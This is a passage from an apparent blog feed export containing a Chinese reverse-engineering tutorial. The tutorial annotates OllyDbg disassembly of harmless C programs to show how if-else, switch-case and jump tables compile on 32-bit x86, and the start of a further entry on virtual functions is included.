]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之32位控制语句解析</title>
    <url>/article/72bff6b6.html</url>
    <content><![CDATA[<h2 id="if-else语句"><a class="anchor" href="#if-else语句">#</a> IF-ELSE 语句</h2>
<p>OD 进入 main 函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331184431096.png" alt="image-20220331184431096" /></p>
<p>函数分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">51</span>            PUSH ECX                                 <span class="token punctuation">;</span>  sub esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401001</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D4424 <span class="token number">00</span>     LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token punctuation">]</span>               <span class="token punctuation">;</span>  将一个局部变量的地址给eax temp</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401005</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX                                 <span class="token punctuation">;</span>  eax压栈 <span class="token operator">&amp;</span>temp</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401006</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">30704000</span>   PUSH if_else<span class="token punctuation">.</span><span class="token number">00407030</span>                    <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040100</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">20000000</span>   CALL if_else<span class="token punctuation">.</span><span class="token number">00401030</span>                    <span class="token punctuation">;</span>  scanf</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401010</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4424 <span class="token number">08</span>     MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  esp <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">=</span> 参数</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span>                                <span class="token punctuation">;</span>  平栈</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401017</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">85</span>C0          TEST EAX<span class="token punctuation">,</span>EAX                             <span class="token punctuation">;</span>  判断eax是不是<span class="token number">0</span>，如果是<span class="token number">0</span>，那么zf <span class="token operator">=</span> <span class="token number">1</span>，否则zf <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401019</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">75</span> <span class="token number">05</span>         JNZ SHORT if_else<span class="token punctuation">.</span><span class="token number">00401020</span>               <span class="token punctuation">;</span>  jnz当zf位为<span class="token number">0</span>时跳转，即eax不为<span class="token number">0</span>的时候跳转</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0040101</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  B8 <span class="token number">08000000</span>   MOV EAX<span class="token punctuation">,</span><span class="token number">8</span>                                <span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>temp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">else</span> temp <span class="token operator">+</span> <span class="token number">5</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">83</span>C0 <span class="token number">05</span>       ADD EAX<span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00401023</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">59</span>            POP ECX</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401024</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	 <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	 <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		 a<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>	 <span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="switch-case语句"><a class="anchor" href="#switch-case语句">#</a> SWITCH-CASE 语句</h2>
<h3 id="未优化编译"><a class="anchor" href="#未优化编译">#</a> 未优化编译</h3>
<p>OD 进入主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331185034721.png" alt="image-20220331185034721" /></p>
<p>主函数分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP                                 <span class="token punctuation">;</span>  保存环境</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401001</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401003</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>EC <span class="token number">08</span>       SUB ESP<span class="token punctuation">,</span><span class="token number">8</span>                                <span class="token punctuation">;</span>  开辟空间</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401006</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D45 FC       LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  将局部变量的地址给eax，eax <span class="token operator">=</span> <span class="token operator">&amp;</span>temp</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401009</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX                                 <span class="token punctuation">;</span>  把eax压栈 <span class="token operator">&amp;</span>temp</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040100</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">30804000</span>   PUSH 未优化编<span class="token number">.00408030</span>                       <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040100F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">8E000000</span>   CALL 未优化编<span class="token number">.004010</span>A2                       <span class="token punctuation">;</span>  scanf</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span>                                <span class="token punctuation">;</span>  平栈</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401017</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4D FC       MOV ECX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  ebp <span class="token operator">-</span> <span class="token number">4</span>时我们scanf接收到的参数</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0040101</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">894</span>D F8       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ECX             <span class="token punctuation">;</span>  ebp <span class="token operator">-</span> <span class="token number">8</span>时接收到的参数</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">0040101</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F8 <span class="token number">01</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00401021</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">74</span> <span class="token number">0</span>E         JE SHORT 未优化编<span class="token number">.00401031</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401023</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F8 <span class="token number">02</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">00401027</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">74</span> <span class="token number">17</span>         JE SHORT 未优化编<span class="token number">.00401040</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">00401029</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F8 <span class="token number">0</span>A    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span>A</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">0040102</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">74</span> <span class="token number">20</span>         JE SHORT 未优化编<span class="token number">.0040104F</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">0040102F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  EB <span class="token number">2</span>D         JMP SHORT 未优化编<span class="token number">.0040105</span>E</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">00401031</span>  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">68</span> <span class="token number">34804000</span>   PUSH 未优化编<span class="token number">.00408034</span>                       <span class="token punctuation">;</span>  ASCII <span class="token string">"a=1"</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">00401036</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">36000000</span>   CALL 未优化编<span class="token number">.00401071</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token number">0040103</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">0040103</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  EB <span class="token number">2</span>B         JMP SHORT 未优化编<span class="token number">.0040106</span>B</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token number">00401040</span>  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">68</span> <span class="token number">38804000</span>   PUSH 未优化编<span class="token number">.00408038</span>                       <span class="token punctuation">;</span>  ASCII <span class="token string">"a=2"</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token number">00401045</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">27000000</span>   CALL 未优化编<span class="token number">.00401071</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token number">0040104</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token number">0040104</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  EB <span class="token number">1</span>C         JMP SHORT 未优化编<span class="token number">.0040106</span>B</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token number">0040104F</span>  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">68</span> <span class="token number">3</span>C804000   PUSH 未优化编<span class="token number">.0040803</span>C                       <span class="token punctuation">;</span>  ASCII <span class="token string">"a=10"</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token number">00401054</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">18000000</span>   CALL 未优化编<span class="token number">.00401071</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token number">00401059</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token number">0040105</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  EB <span class="token number">0</span>D         JMP SHORT 未优化编<span class="token number">.0040106</span>B</pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token number">0040105</span>E  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">68</span> <span class="token number">44804000</span>   PUSH 未优化编<span class="token number">.00408044</span>                       <span class="token punctuation">;</span>  ASCII <span class="token string">"a=default"</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token number">00401063</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">09000000</span>   CALL 未优化编<span class="token number">.00401071</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token number">00401068</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token number">0040106</span>B  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token number">0040106</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP</pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token number">0040106F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token number">00401070</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><h3 id="优化编译"><a class="anchor" href="#优化编译">#</a> 优化编译</h3>
<p>进入主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331185500093.png" alt="image-20220331185500093" /></p>
<p>函数分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">51</span>            PUSH ECX                                 <span class="token punctuation">;</span>  优化编译<span class="token number">.004080</span>D0</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401001</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D4424 <span class="token number">00</span>     LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401005</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401006</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">4</span>C804000   PUSH 优化编译<span class="token number">.0040804</span>C                       <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040100</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">91000000</span>   CALL 优化编译<span class="token number">.004010</span>A1</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401010</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4424 <span class="token number">08</span>     MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401017</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">48</span>            DEC EAX                                  <span class="token punctuation">;</span>  <span class="token function">Switch</span> <span class="token punctuation">(</span>cases <span class="token number">1.</span><span class="token punctuation">.</span>A<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401018</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">74</span> <span class="token number">3</span>B         JE SHORT 优化编译<span class="token number">.00401055</span>                   <span class="token punctuation">;</span>  case1</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0040101</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">48</span>            DEC EAX                                  <span class="token punctuation">;</span>  cmp</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">0040101</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">74</span> <span class="token number">27</span>         JE SHORT 优化编译<span class="token number">.00401044</span>                   <span class="token punctuation">;</span>  case2</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">0040101</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83E8</span> <span class="token number">08</span>       SUB EAX<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">74</span> <span class="token number">11</span>         JE SHORT 优化编译<span class="token number">.00401033</span>                   <span class="token punctuation">;</span>  case10</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">00401022</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">40804000</span>   PUSH 优化编译<span class="token number">.00408040</span>                       <span class="token punctuation">;</span>  ASCII <span class="token string">"a=default"</span><span class="token punctuation">;</span> Default <span class="token keyword">case</span> of <span class="token keyword">switch</span> <span class="token number">00401017</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">00401027</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">44000000</span>   CALL 优化编译<span class="token number">.00401070</span></pre></td></tr></table></figure><p>在优化后的版本中通过<strong>减法</strong>来代替<strong>对比</strong>，从而使得执行速度更快</p>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	 <span class="token keyword">int</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	</pre></td></tr><tr><td data-num="8"></td><td><pre>	 <span class="token keyword">switch</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	 <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		<span class="token keyword">case</span> <span class="token number">1</span> <span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>				    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>		<span class="token keyword">case</span> <span class="token number">2</span> <span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>					<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token keyword">case</span> <span class="token number">10</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>					<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>		<span class="token keyword">default</span> <span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=default"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>					 <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	 <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>	 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="switch-case语句跳表"><a class="anchor" href="#switch-case语句跳表">#</a> SWITCH-CASE 语句跳表</h2>
<p>OD 分析：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331190343598.png" alt="image-20220331190343598" /></p>
<p>计算完之后跳转到跳转表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331190409474.png" alt="image-20220331190409474" /></p>
<p>以间接取址的方式，在跳转表中查找存储的地址，在跳转表中就计算好了值就不用一个一个进行比对，可以节省大量的时间，不用来回跳转。</p>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	 <span class="token keyword">int</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	</pre></td></tr><tr><td data-num="8"></td><td><pre>	 <span class="token keyword">switch</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	 <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		<span class="token keyword">case</span> <span class="token number">1</span> <span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>				    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>		<span class="token keyword">case</span> <span class="token number">2</span> <span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>					<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>					<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>		<span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>					<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>					<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=6"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>					<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=7"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>					<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>		<span class="token keyword">default</span> <span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=default"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>					 <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	 <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>	 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/E52C7378209481D59055F03A91EDB7CE.jpg" alt="img-E52C7378209481D59055F03A91EDB7CE" /></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之32位虚函数与循环语句分析</title>
    <url>/article/b7fc83d0.html</url>
    <content><![CDATA[<h2 id="虚函数"><a class="anchor" href="#虚函数">#</a> 虚函数</h2>
<p>虚函数是 C<ins> 中的一个概念，而众所周知 C</ins> 是一门面向对象的语言。</p>
<p>C++ 的特性：</p>
<ul>
<li>
<p>封装</p>
</li>
<li>
<p>集成</p>
</li>
<li>
<p>多态</p>
</li>
</ul>
